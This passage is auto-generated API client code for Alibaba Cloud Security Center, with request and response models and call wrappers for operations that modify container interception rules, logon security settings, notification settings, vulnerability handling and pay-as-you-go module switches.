  if (!Util.isUnset(request.orderIndex)) {
    query['OrderIndex'] = request.orderIndex;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  if (!Util.isUnset(request.srcTargetShrink)) {
    query['SrcTarget'] = request.srcTargetShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a proactive defense rule for containers.
 *
 * @param request ModifyInterceptionRuleRequest
 * @return ModifyInterceptionRuleResponse
 */
async function modifyInterceptionRule(request: ModifyInterceptionRuleRequest): ModifyInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionRuleWithOptions(request, runtime);
}

model ModifyInterceptionRuleSwitchRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='ce5c29aba99694ade9ba85dc620b4****'),
  ruleIds?: string(name='RuleIds', description='The IDs of the rules whose status you want to change. Separate multiple IDs with commas (,).

> You can call the [ListInterceptionRulePage](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of rules.', example='403287'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies whether the rule is enabled. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
}

model ModifyInterceptionRuleSwitchResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DE725A60-95F2-50E8-8F5D-81055215E7DA'),
}

model ModifyInterceptionRuleSwitchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyInterceptionRuleSwitchResponseBody(name='body'),
}

/**
 * @summary Enables or disables a proactive defense rule for containers.
 *
 * @param request ModifyInterceptionRuleSwitchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyInterceptionRuleSwitchResponse
 */
async function modifyInterceptionRuleSwitchWithOptions(request: ModifyInterceptionRuleSwitchRequest, runtime: Util.RuntimeOptions): ModifyInterceptionRuleSwitchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionRuleSwitch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables a proactive defense rule for containers.
 *
 * @param request ModifyInterceptionRuleSwitchRequest
 * @return ModifyInterceptionRuleSwitchResponse
 */
async function modifyInterceptionRuleSwitch(request: ModifyInterceptionRuleSwitchRequest): ModifyInterceptionRuleSwitchResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionRuleSwitchWithOptions(request, runtime);
}

model ModifyInterceptionTargetRequest {
  appName?: string(name='AppName', description='The name of the application.

> You can call the [DescribeContainerTags](~~DescribeContainerTags~~) operation to obtain the value of this parameter.', example='yasintt-daemonst'),
  imageList?: [ string ](name='ImageList', description='An array that consists of images.

> You can call the [DescribeContainerTags](~~DescribeContainerTags~~) operation to obtain the value of this parameter.'),
  namespace?: string(name='Namespace', description='The namespace.

> You can call the [DescribeContainerTags](~~DescribeContainerTags~~) operation to obtain the value of this parameter.

This parameter is required.', example='demo4'),
  tagList?: [ string ](name='TagList', description='An array that consists of tags.

> You can call the [DescribeContainerTags](~~DescribeContainerTags~~) operation to obtain the value of this parameter.'),
  targetId?: long(name='TargetId', description='The ID of the network object.

> You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to obtain the value of this parameter.

This parameter is required.', example='400913'),
  targetName?: string(name='TargetName', description='The name.

This parameter is required.', example='test001'),
  targetType?: string(name='TargetType', description='The object type. Valid values:

*   **IMAGE**

This parameter is required.', example='IMAGE'),
}

model ModifyInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='16CB4467-56AE-546C-BF19-AD4584C0DD03'),
  result?: boolean(name='Result', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyInterceptionTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyInterceptionTargetResponseBody(name='body'),
}

/**
 * @summary Modifies the information about a network object of the container firewall feature.
 *
 * @param request ModifyInterceptionTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyInterceptionTargetResponse
 */
async function modifyInterceptionTargetWithOptions(request: ModifyInterceptionTargetRequest, runtime: Util.RuntimeOptions): ModifyInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetId)) {
    query['TargetId'] = request.targetId;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the information about a network object of the container firewall feature.
 *
 * @param request ModifyInterceptionTargetRequest
 * @return ModifyInterceptionTargetResponse
 */
async function modifyInterceptionTarget(request: ModifyInterceptionTargetRequest): ModifyInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionTargetWithOptions(request, runtime);
}

model ModifyLogMetaStatusRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  logStore?: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.

>  You can call the [DescribeLogMeta](~~DescribeLogMeta~~) operation to query the names of Logstores.

This parameter is required.', example='aegis-log-login'),
  project?: string(name='Project', description='The name of the project.

>  You can call the [DescribeLogMeta](~~DescribeLogMeta~~) operation to query the names of projects.', example='aegis-log'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='1232428423234****'),
  status?: string(name='Status', description='The status of the log analysis feature. Valid values:

*   **enabled**
*   **disabled**

This parameter is required.', example='disabled'),
}

model ModifyLogMetaStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='861445A7-B6D6-5825-B015-CD46ED90613A'),
}

model ModifyLogMetaStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyLogMetaStatusResponseBody(name='body'),
}

/**
 * @summary Enables or disables the log analysis feature.
 *
 * @param request ModifyLogMetaStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyLogMetaStatusResponse
 */
async function modifyLogMetaStatusWithOptions(request: ModifyLogMetaStatusRequest, runtime: Util.RuntimeOptions): ModifyLogMetaStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.logStore)) {
    query['LogStore'] = request.logStore;
  }
  if (!Util.isUnset(request.project)) {
    query['Project'] = request.project;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLogMetaStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables the log analysis feature.
 *
 * @param request ModifyLogMetaStatusRequest
 * @return ModifyLogMetaStatusResponse
 */
async function modifyLogMetaStatus(request: ModifyLogMetaStatusRequest): ModifyLogMetaStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLogMetaStatusWithOptions(request, runtime);
}

model ModifyLoginBaseConfigRequest {
  config?: string(name='Config', description='The details of the configuration that is used to detect unusual logons to your servers. The value of this parameter is in the JSON format and contains the following fields:

*   **totalCount**: the total number of servers.
*   **uuidCount**: the number of servers to which the configuration is applied.
*   **id**: the ID of the configuration.
*   **location**: the common logon location.

> You must specify this field if the Type parameter is set to login_common_location.

*   **ip**: the common logon IP address.

> You must specify this field if the Type parameter is set to login_common_ip.

*   **endTime**: the end time of the common logon time range.

> You must specify this field if the Type parameter is set to login_common_time.

*   **startTime**: the start time of the common logon time range.

> You must specify this field if the Type parameter is set to login_common_time.

*   **account**: the common logon account.

> You must specify this field if the Type parameter is set to login_common_account.

This parameter is required.', example='{"totalCount":174,"uuidCount":4,"location":"Montenegro","id":0}'),
  target?: string(name='Target', description='The details of the server to which the configuration is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **Target**: the UUID of the server.

*   **targetType**: the type of the server to which the configuration is applied. Valid values:

    *   **uuid**: a server
    *   **groupId**: a server group

*   **flag**: the operation that you want to perform on the server. Valid values:

    *   **del**: removes the server from the configuration.
    *   **add**: adds the server to the configuration.

This parameter is required.', example='[{"target":"inet-7c676676-06fa-442e-90fb-b802e5d6****","targetType":"uuid","flag":"add"}]'),
  type?: string(name='Type', description='The logon type of the configuration to modify. Valid values:

*   **login_common_location**: common logon location
*   **login_common_ip**: common logon IP address
*   **login_common_time**: common logon time range
*   **login_common_account**: common logon account

This parameter is required.', example='login_common_location'),
}

model ModifyLoginBaseConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AB96FDDF-ED29-52B1-9FAE-8203F2808F24'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyLoginBaseConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyLoginBaseConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the logon configuration for a specified asset.
 *
 * @param request ModifyLoginBaseConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyLoginBaseConfigResponse
 */
async function modifyLoginBaseConfigWithOptions(request: ModifyLoginBaseConfigRequest, runtime: Util.RuntimeOptions): ModifyLoginBaseConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLoginBaseConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the logon configuration for a specified asset.
 *
 * @param request ModifyLoginBaseConfigRequest
 * @return ModifyLoginBaseConfigResponse
 */
async function modifyLoginBaseConfig(request: ModifyLoginBaseConfigRequest): ModifyLoginBaseConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLoginBaseConfigWithOptions(request, runtime);
}

model ModifyLoginSwitchConfigRequest {
  item?: string(name='Item', description='The type of the logon security settings that you want to enable or disable. Valid values:

*   **login_common_ip**: unapproved logon IP addresses
*   **login_common_time**: unapproved logon time ranges
*   **login_common_account**: unapproved logon accounts

This parameter is required.', example='login_common_account'),
  status?: int32(name='Status', description='Specifies whether to enable the logon security settings. Valid values:

*   **0**: no
*   **1**: yes

This parameter is required.', example='0'),
}

model ModifyLoginSwitchConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
}

model ModifyLoginSwitchConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyLoginSwitchConfigResponseBody(name='body'),
}

/**
 * @summary Enables or disables the logon security settings for an asset.
 *
 * @param request ModifyLoginSwitchConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyLoginSwitchConfigResponse
 */
async function modifyLoginSwitchConfigWithOptions(request: ModifyLoginSwitchConfigRequest, runtime: Util.RuntimeOptions): ModifyLoginSwitchConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.item)) {
    query['Item'] = request.item;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLoginSwitchConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables the logon security settings for an asset.
 *
 * @param request ModifyLoginSwitchConfigRequest
 * @return ModifyLoginSwitchConfigResponse
 */
async function modifyLoginSwitchConfig(request: ModifyLoginSwitchConfigRequest): ModifyLoginSwitchConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLoginSwitchConfigWithOptions(request, runtime);
}

model ModifyNoticeConfigRequest {
  project?: string(name='Project', description='The identifier of the notification item. Valid values:

*   **yundun_security_Weekreport**: notification for vulnerabilities
*   **yundun_sas_antiransomware_task**: notification for results of restoration tasks
*   **sas_healthcheck**: notification for baseline checks
*   **sas_suspicious**: notification for alerts generated by Security Center
*   **yundun_aegis_AV_true**: notification for precision defense
*   **yundun_sas_ak_leakage**: notification for AccessKey pair leaks
*   **yundun_sas_config_alert**: notification for configuration assessment
*   **yundun_sas_vul_Emergency**: notification for urgent vulnerabilities
*   **yundun_webguard_event**: notification for web tamper proofing
*   **yundun_sas_cloud_native_firewall**: notification for alerts generated by the container firewall feature
*   **yundun_sas_cloud_native_firewall_Defense**: notification for proactive defense implemented by the container firewall feature
*   **yundun_IP_Blocking**: notification for blocked brute-force attacks initiated from malicious IP addresses
*   **yundun_sas_anti_virus_config**: notification for virus scan
*   **yundun_sas_log**: notification for excess logs
*   **yundun_honeypot_alarm**: notification for alerts generated by the honeypot feature
*   **aliyun_rasp_alarm**: notification for alerts generated by the application security feature
*   **virusScheduleTask**: notification for completion of scheduled virus scans
*   **yundun_anti_Virus**: notification that no security checks are performed
*   **sas_vulnerability**: notification for vulnerabilities
*   **weeklyreport**: notification for weekly reports
*   **agent**: notification that the Security Center agent is offline
*   **bruteforcesuccess**: notification for protection against brute-force attacks
*   **webshell**: notification for webshells
*   **suspicious**: notification for alerts generated by Server Guard
*   **patch**: deprecated
*   **remotelogin**: notification for remote logons
*   **health**: notification for security checks
*   **yundun_sas_cloudsiem_log**: notifications of insufficient threat analysis log capacity

> If the value is **yundun_security_Weekreport**, weekly reports are sent to notify you of unhandled vulnerabilities.', example='yundun_webguard_event'),
  route?: int32(name='Route', description='The notification method. Valid values:

*   **1**: text message
*   **2**: email
*   **4**: internal message
*   **3**: text message and email
*   **5**: text message and internal message
*   **6**: email and internal message
*   **7**: text message, email, and internal message', example='4'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.178.XX.XX'),
  timeLimit?: int32(name='TimeLimit', description='The time period during which Security Center sends notifications. Valid values:

*   **0**: any time
*   **1**: 08:00 to 22:00', example='1'),
}

model ModifyNoticeConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5989D067-621F-51E2-A636-D94D1388****'),
}

model ModifyNoticeConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyNoticeConfigResponseBody(name='body'),
}

/**
 * @summary Modifies notification settings.
 *
 * @param request ModifyNoticeConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyNoticeConfigResponse
 */
async function modifyNoticeConfigWithOptions(request: ModifyNoticeConfigRequest, runtime: Util.RuntimeOptions): ModifyNoticeConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.project)) {
    query['Project'] = request.project;
  }
  if (!Util.isUnset(request.route)) {
    query['Route'] = request.route;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.timeLimit)) {
    query['TimeLimit'] = request.timeLimit;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyNoticeConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies notification settings.
 *
 * @param request ModifyNoticeConfigRequest
 * @return ModifyNoticeConfigResponse
 */
async function modifyNoticeConfig(request: ModifyNoticeConfigRequest): ModifyNoticeConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyNoticeConfigWithOptions(request, runtime);
}

model ModifyOpenLogShipperRequest {
  from?: string(name='From', description='The ID of the request source. Default value: **aegis**. Valid values:

*   **aegis**: Server Guard
*   **sas**: Security Center

>  If you use Server Guard, set the value to **aegis**. If you use Security Center, set the value to **sas**.', example='sas'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****'),
}

model ModifyOpenLogShipperResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='25EC270F-5783-4416-AD7C-1EDF063A039C'),
}

model ModifyOpenLogShipperResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyOpenLogShipperResponseBody(name='body'),
}

/**
 * @summary Activates Simple Log Service.
 *
 * @description **Prerequisites** [Simple Log Service](https://www.alibabacloud.com/help/en/log-service/latest/billable-items) is activated. A service-linked role for Security Center is created, and Security Center is authorized to access cloud resources. You can call the [CreateServiceLinkedRole](~~CreateServiceLinkedRole~~) operation to create a service-linked role for Security Center and authorize Security Center to access cloud resources. **Scenarios** Before you use the log analysis feature of Security Center, you must call the [ModifyOpenLogShipper](~~ModifyOpenLogShipper~~) operation to activate Simple Log Service.
 *
 * @param request ModifyOpenLogShipperRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyOpenLogShipperResponse
 */
async function modifyOpenLogShipperWithOptions(request: ModifyOpenLogShipperRequest, runtime: Util.RuntimeOptions): ModifyOpenLogShipperResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyOpenLogShipper',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Activates Simple Log Service.
 *
 * @description **Prerequisites** [Simple Log Service](https://www.alibabacloud.com/help/en/log-service/latest/billable-items) is activated. A service-linked role for Security Center is created, and Security Center is authorized to access cloud resources. You can call the [CreateServiceLinkedRole](~~CreateServiceLinkedRole~~) operation to create a service-linked role for Security Center and authorize Security Center to access cloud resources. **Scenarios** Before you use the log analysis feature of Security Center, you must call the [ModifyOpenLogShipper](~~ModifyOpenLogShipper~~) operation to activate Simple Log Service.
 *
 * @param request ModifyOpenLogShipperRequest
 * @return ModifyOpenLogShipperResponse
 */
async function modifyOpenLogShipper(request: ModifyOpenLogShipperRequest): ModifyOpenLogShipperResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyOpenLogShipperWithOptions(request, runtime);
}

model ModifyOperateVulRequest {
  from?: string(name='From', description='The request ID. Set the value to **sas**.', example='sas'),
  info?: string(name='Info', description='The details of the vulnerability. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the name of the vulnerability.

*   **uuid**: the UUID of the server on which the vulnerability is detected.

*   **tag**: the tag that is added to the vulnerability. Valid values:

    *   **oval**: Linux software vulnerability
    *   **system**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability

>  You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the tags that are added to vulnerabilities of other types.

*   **isFront**: specifies whether a pre-patch is required to fix the Windows system vulnerability. This field is required only for Windows system vulnerabilities. Valid values:

    *   **0**: no
    *   **1**: yes

>  You can fix multiple vulnerabilities at a time. Separate the details of multiple vulnerabilities with commas (,). You can call the [DescribeVulLIst](~~DescribeVulList~~) operation to query the details of vulnerabilities.

This parameter is required.', example='[{"name":"alilinux2:2.1903:ALINUX2-SA-2022:0007","uuid":"a3bb82a8-a3bd-4546-acce-45ac34af****","tag":"oval","isFront":0},{"name":"alilinux2:2.1903:ALINUX2-SA-2022:0007","uuid":"98a6fecc-88cd-46f2-8e35-f808a388****","tag":"oval","isFront":0}]'),
  operateType?: string(name='OperateType', description='The operation that you want to perform on the vulnerability. Valid values:

*   **vul_fix**: fixes the vulnerability.
*   **vul_verify**: verifies the vulnerability fix.
*   **vul_ignore**: ignores the vulnerability.
*   **vul_undo_ignore**: cancels ignoring the vulnerability.
*   **vul_delete**: deletes the vulnerability.

This parameter is required.', example='vul_fix'),
  reason?: string(name='Reason', description='The reason why the vulnerability is **ignored**.

>  This parameter is required only when you set **OperateType** to **vul_ignore**.', example='not operate'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: application vulnerability
*   **sca**: vulnerability that is detected based on software component analysis

>  You cannot fix the urgent vulnerabilities, application vulnerabilities, or vulnerabilities that are detected based on software component analysis.

This parameter is required.', example='cve'),
}

model ModifyOperateVulResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DFE4F166-1AC9-4FAC-A4E4-F0608AD705A6'),
}

model ModifyOperateVulResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyOperateVulResponseBody(name='body'),
}

/**
 * @summary Handles detected vulnerabilities. You can fix, check, or ignore the vulnerabilities.
 *
 * @param request ModifyOperateVulRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyOperateVulResponse
 */
async function modifyOperateVulWithOptions(request: ModifyOperateVulRequest, runtime: Util.RuntimeOptions): ModifyOperateVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyOperateVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handles detected vulnerabilities. You can fix, check, or ignore the vulnerabilities.
 *
 * @param request ModifyOperateVulRequest
 * @return ModifyOperateVulResponse
 */
async function modifyOperateVul(request: ModifyOperateVulRequest): ModifyOperateVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyOperateVulWithOptions(request, runtime);
}

model ModifyPostPayModuleSwitchRequest {
  postPayInstanceId?: string(name='PostPayInstanceId', description='The ID of the pay-as-you-go instance. This parameter is required.

>  You can call the [DescribeVersionConfig](https://help.aliyun.com/document_detail/421770.html) operation to obtain the ID.', example='postpay-sas-**'),
  postPayModuleSwitch?: string(name='PostPayModuleSwitch', description='The switch status of the pay-as-you-go module. The value is a JSON string. Valid values:

*   Key:

    *   **VUL**: vulnerability fixing module
    *   **CSPM**: cloud service configuration check module
    *   **AGENTLESS**: agentless detection module
    *   **SERVERLESS**: serverless asset module

*   Value: A value of 0 specifies disabled. A value of 1 specifies enabled.

>  If you do not specify a value for a module, the original value of the module is retained.', example='{"VUL":1,"CSPM":0}'),
}

model ModifyPostPayModuleSwitchResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='D03DD0FD-**28F1'),
  success?: boolean(name='Success', description='Indicates whether the call is successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ModifyPostPayModuleSwitchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyPostPayModuleSwitchResponseBody(name='body'),
}

/**
 * @summary Modifies the switch settings of pay-as-you-go modules.
 *
 * @param request ModifyPostPayModuleSwitchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyPostPayModuleSwitchResponse
 */
async function modifyPostPayModuleSwitchWithOptions(request: ModifyPostPayModuleSwitchRequest, runtime: Util.RuntimeOptions): ModifyPostPayModuleSwitchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.postPayInstanceId)) {
    query['PostPayInstanceId'] = request.postPayInstanceId;
  }
  if (!Util.isUnset(request.postPayModuleSwitch)) {
    query['PostPayModuleSwitch'] = request.postPayModuleSwitch;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPostPayModuleSwitch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the switch settings of pay-as-you-go modules.
 *
 * @param request ModifyPostPayModuleSwitchRequest
 * @return ModifyPostPayModuleSwitchResponse
 */
async function modifyPostPayModuleSwitch(request: ModifyPostPayModuleSwitchRequest): ModifyPostPayModuleSwitchResponse {
  var runtime = new Util.RuntimeOptions{};
